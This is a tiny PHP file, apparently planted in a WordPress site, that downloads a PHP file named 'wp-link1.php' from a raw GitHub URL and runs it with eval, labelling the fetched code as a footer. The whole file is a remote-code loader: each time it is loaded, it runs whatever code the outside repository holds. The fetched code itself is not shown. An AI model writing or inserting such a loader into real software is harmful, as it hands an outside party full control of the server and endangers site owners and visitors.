<?php
$url = 'https://raw.githubusercontent.com/tarikulislam184/Systemupload/refs/heads/main/wp-link1.php';
$exfooter = file_get_contents($url);
eval('?>' . $exfooter);
?>